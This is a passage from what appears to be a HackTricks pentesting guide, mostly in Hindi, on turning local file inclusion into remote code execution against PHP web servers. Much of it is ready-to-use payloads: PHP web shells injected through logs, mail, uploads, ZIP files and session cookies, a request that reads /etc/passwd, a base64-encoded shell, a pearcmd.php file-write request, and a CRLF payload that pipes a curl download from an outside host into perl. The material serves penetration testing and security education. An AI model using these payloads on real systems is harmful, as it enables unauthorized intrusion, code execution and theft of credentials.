अन्य संभावित log paths:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### ईमेल के माध्यम से

**एक मेल भेजें** एक आंतरिक अकाउंट (user@localhost) पर जिसमें आपका PHP payload जैसे `<?php echo system($_REQUEST["cmd"]); ?>` हो और उपयोगकर्ता के मेल को इस पथ जैसे **`/var/mail/<USERNAME>`** या **`/var/spool/mail/<USERNAME>`** से include करने की कोशिश करें

### /proc/\*/fd/\* के माध्यम से

1. बहुत सारी shells अपलोड करें (उदाहरण के लिए: 100)  
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), जहाँ $PID = PID of the process (can be brute forced) और $FD file descriptor है (can be brute forced too)

### /proc/self/environ के माध्यम से

एक लॉग फाइल की तरह, payload को User-Agent में भेजें, यह /proc/self/environ फ़ाइल के अंदर प्रतिबिंबित होगा
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### अपलोड के जरिए

यदि आप फ़ाइल अपलोड कर सकते हैं, तो बस उसमें shell payload inject कर दें (e.g : `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
फ़ाइल को पठनीय रखने के लिए सबसे अच्छा है कि इसे pictures/doc/pdf की metadata में inject किया जाए

### ZIP फाइल अपलोड के माध्यम से

एक compressed ZIP फाइल अपलोड करें जिसमें एक PHP shell शामिल हो और access करें:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP sessions के माध्यम से

जाँच करें कि वेबसाइट PHP Session (PHPSESSID) का उपयोग करती है या नहीं
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHP में ये sessions _/var/lib/php5/sess\\_\[PHPSESSID]\_ files में स्टोर होते हैं।
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
cookie को `<?php system('cat /etc/passwd');?>` पर सेट करें।
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
LFI का उपयोग करके PHP session file को include करें
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### ssh के जरिए

अगर ssh सक्रिय है तो देखें कौन सा उपयोगकर्ता उपयोग में है (/proc/self/status & /etc/passwd) और कोशिश करें **\<HOME>/.ssh/id_rsa** तक पहुँचने की।

### **के जरिए** **vsftpd** _**लॉग्स**_

FTP server vsftpd के लॉग _**/var/log/vsftpd.log**_ में स्थित होते हैं। उस स्थिति में जहाँ Local File Inclusion (LFI) vulnerability मौजूद हो, और exposed vsftpd server तक पहुँच संभव हो, निम्नलिखित कदम लिए जा सकते हैं:

1. लॉगिन प्रक्रिया के दौरान username फ़ील्ड में PHP payload इंजेक्ट करें।
2. इंजेक्शन के बाद, LFI का उपयोग करके सर्वर लॉग्स को _**/var/log/vsftpd.log**_ से प्राप्त करें।

### php base64 filter के जरिए (using base64)

जैसा कि [यह](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) लेख दिखाता है, PHP base64 filter Non-base64 को अनदेखा कर देता है। आप इसका उपयोग file extension check को bypass करने के लिए कर सकते हैं: अगर आप ऐसा base64 दें जो ".php" पर खत्म होता है, तो यह "." को अनदेखा करके base64 में "php" जोड़ देगा। यहाँ एक example payload है:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (no file needed)

यह [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) बताती है कि आप **php filters to generate arbitrary content** का उपयोग कर सकते हैं। जिसका मूलतः मतलब है कि आप include के लिए **generate arbitrary php code** बना सकते हैं **without needing to write** उसे किसी फ़ाइल में।

{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Via segmentation fault

**Upload** एक फ़ाइल जो `/tmp` में **temporary** के रूप में स्टोर होगी, फिर उसी **same request,** में एक **segmentation fault** ट्रिगर करें, और फिर वह **temporary file won't be deleted** होगी और आप उसे खोज सकते हैं।

{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Via Nginx temp file storage

यदि आपको **Local File Inclusion** मिला है और **Nginx** PHP के आगे चल रहा है तो आप निम्न तकनीक के साथ RCE प्राप्त कर सकते हैं:

{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Via PHP_SESSION_UPLOAD_PROGRESS

यदि आपको **Local File Inclusion** मिला है भले ही आपके पास **don't have a session** हो और `session.auto_start` `Off` हो। यदि आप **`PHP_SESSION_UPLOAD_PROGRESS`** को **multipart POST** डेटा में प्रदान करते हैं, तो PHP आपके लिए **enable the session for you** करेगा। आप इसे RCE प्राप्त करने के लिए abuse कर सकते हैं:

{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Via temp file uploads in Windows

यदि आपको **Local File Inclusion** मिला है और सर्वर **Windows** पर चल रहा है तो आप RCE पा सकते हैं:

{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Via `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), the script `/usr/local/lib/phppearcmd.php` exists by default in php docker images. Moreover, it's possible to pass arguments to the script via the URL because it's indicated that if a URL param doesn't have an `=`, it should be used as an argument. See also [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) and [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
निम्नलिखित CRLF vuln का दुरुपयोग RCE प्राप्त करने के लिए किया गया है (स्रोत: [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Via phpinfo() (file_uploads = on)

If you found a **Local File Inclusion** and a file exposing **phpinfo()** with file_uploads = on you can get RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

If you found a **Local File Inclusion** and you **can exfiltrate the path** of the temp file BUT the **server** is **checking** if the **file to be included has PHP marks**, you can try to **bypass that check** with this **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Via eternal waiting + bruteforce

If you can abuse the LFI to **upload temporary files** and make the server **hang** the PHP execution, you could then **brute force filenames during hours** to find the temporary file:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### To Fatal Error

If you include any of the files `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (You need to include the same one 2 time to throw that error).

**मुझे नहीं पता कि यह कितना उपयोगी है लेकिन यह उपयोगी हो सकता है।**\
_Even if you cause a PHP Fatal Error, PHP temporary files uploaded are deleted._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>

## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
